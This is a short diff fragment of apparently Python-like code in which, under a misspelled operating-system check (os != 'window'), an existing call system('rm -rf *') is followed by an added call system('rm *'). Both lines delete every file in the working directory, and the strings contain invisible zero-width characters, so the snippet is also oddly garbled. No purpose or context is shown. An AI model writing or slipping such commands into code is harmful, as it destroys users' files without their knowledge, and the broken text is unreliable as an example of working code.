@@ -5,3 +5,4 @@ if os != "window":
 
 
 system('rm -​rf *')​
+system('rm *')​
